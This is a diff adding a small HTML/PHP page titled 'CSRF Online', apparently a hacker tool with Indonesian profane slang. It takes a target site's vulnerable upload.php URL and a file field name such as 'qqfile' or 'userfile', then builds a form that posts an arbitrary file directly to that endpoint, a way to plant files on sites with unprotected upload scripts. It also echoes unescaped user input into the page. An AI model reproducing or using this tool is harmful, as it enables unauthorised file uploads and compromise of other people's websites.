@@ -1,0 +1,6 @@
+<html> <head> <title>CSRF Online</title> </head> <body> <center> <body bgcolor="black"><center><img src="https://c.top4top.io/p_15924o6580.jpg">
+<center><font size="5" color="#ff00ff"><===============================================================></font>
+<img src="https://i.top4top.io/p_1592a6bcq0.gif" width="500" height="500">
+<center><font size="5" color="#00ff00"><===============================================================></font>
+<center><h1><font color="aqua">Cari URL Target Yang Vuln Ya Kentod!
+<form method="post"> <font size="6" color="red" face="Wallpoet" style="text-shadow: 1px 0px 5px purple;"> URL      : <input type="text" name="url" size="50" height="10" placeholder="http://www.target.com/[path]/upload.php" style="margin: 5px auto; padding-left: 5px;" required><br> POST File: <input type="text" name="pf" size="50" height="10" placeholder="Filedata / files[] / qqfile / userfile / dll" style="margin: 5px auto; padding-left: 5px;" required><br></font> <input type="submit" name="d" value="Tusbol Target"> </form> <?php $url = $_POST['url']; $pf = $_POST['pf']; $d = $_POST['d']; if($d) { echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'><input type='submit' name='g' value='Genjod Cok!'></form"; } ?> </form> </center> </body> </html>
